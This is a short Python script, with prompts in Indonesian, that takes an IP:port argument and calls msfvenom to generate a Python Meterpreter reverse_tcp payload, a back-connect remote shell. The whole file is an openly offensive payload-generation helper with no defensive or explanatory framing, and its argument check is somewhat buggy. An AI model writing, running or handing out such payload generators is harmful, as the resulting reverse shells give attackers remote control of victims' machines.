import os, sys
if ':' in sys.argv:
        print ("masukkan ip dan port client BackConnect!")
else:
        if ":" in sys.argv[1]:
                raw = sys.argv[1]
                lhost = raw.split(':')[0]
                lport = raw.split(':')[1]
                print (f"lhost: {lhost}\nlport: {lport}")
                os.system(f"kali -c 'msfvenom -f raw -p python/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport}'")
        else:
                print ("masukkan ip dan port client BackConnect!")